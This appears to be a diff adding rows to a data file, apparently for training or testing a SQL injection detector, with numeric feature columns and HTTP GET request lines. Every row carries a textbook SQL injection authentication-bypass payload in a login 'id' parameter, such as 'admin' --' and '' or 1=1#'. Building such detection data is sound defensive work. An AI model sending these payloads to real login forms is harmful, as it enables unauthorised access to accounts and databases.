@@ -1,0 +1,100 @@
+32,1,200,5782,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,2377,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,5110,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,3450,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,3494,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,7234,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,4721,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,2930,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,2623,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,2964,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,6597,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,5712,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,6092,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,7003,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,5767,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,5229,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,1315,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,3952,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,4032,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,5641,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,3048,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,3353,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,5443,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,3671,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,3652,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,6762,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,7829,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,7073,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,7427,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,4977,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,1620,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,3185,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,4556,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,5588,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,5938,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,2519,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,4706,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,6092,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,6549,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,3076,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,6552,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+53,2,200,2607,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,5551,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,4447,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,4288,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,7853,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,4318,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,4872,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,3485,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,3652,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,7867,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,6549,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,6221,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,1258,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,3416,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,7521,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+53,2,200,4864,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
+31,1,200,2300,7,4,11,1,1,GET ?id=') or '1'='1-- HTTP/1.1
+31,1,200,6586,7,4,11,1,1,GET ?id=') or '1'='1-- HTTP/1.1
+31,1,200,1527,7,4,11,1,1,GET ?id=') or '1'='1-- HTTP/1.1
+31,1,200,1550,7,4,11,1,1,GET ?id=') or '1'='1-- HTTP/1.1
+31,1,200,3716,7,4,11,1,1,GET ?id=') or '1'='1-- HTTP/1.1
+31,1,200,5432,7,4,11,1,1,GET ?id=') or '1'='1-- HTTP/1.1
+31,1,200,6348,7,4,11,1,1,GET ?id=') or '1'='1-- HTTP/1.1
+31,1,200,2576,7,4,11,1,1,GET ?id=') or '1'='1-- HTTP/1.1
+31,1,200,5292,7,4,11,1,1,GET ?id=') or '1'='1-- HTTP/1.1
+31,1,200,4861,7,4,11,1,1,GET ?id=') or '1'='1-- HTTP/1.1
+31,1,200,1532,7,4,11,1,1,GET ?id=') or '1'='1-- HTTP/1.1
+31,1,200,1123,7,4,11,1,1,GET ?id=') or '1'='1-- HTTP/1.1
+31,1,200,3231,7,4,11,1,1,GET ?id=') or '1'='1-- HTTP/1.1
+31,1,200,3696,7,4,11,1,1,GET ?id=') or '1'='1-- HTTP/1.1
+31,1,200,7745,7,4,11,1,1,GET ?id=') or '1'='1-- HTTP/1.1
+31,1,200,3494,7,4,11,1,1,GET ?id=') or '1'='1-- HTTP/1.1
+31,1,200,3561,7,4,11,1,1,GET ?id=') or '1'='1-- HTTP/1.1
+31,1,200,5549,7,4,11,1,1,GET ?id=') or '1'='1-- HTTP/1.1
+31,1,200,2547,7,4,11,1,1,GET ?id=') or '1'='1-- HTTP/1.1
+31,1,200,2492,7,4,11,1,1,GET ?id=') or '1'='1-- HTTP/1.1
+31,1,200,5127,7,4,11,1,1,GET ?id=') or '1'='1-- HTTP/1.1
+31,1,200,7994,7,4,11,1,1,GET ?id=') or '1'='1-- HTTP/1.1
+31,1,200,4419,7,4,11,1,1,GET ?id=') or '1'='1-- HTTP/1.1
+75,2,200,7156,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,4491,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,1429,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,5451,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,2278,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,2508,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,7805,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,5547,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,4951,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,5973,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,7817,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,7000,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,1928,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,5483,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,2319,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,6999,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,7222,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,1016,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,3029,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,7154,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
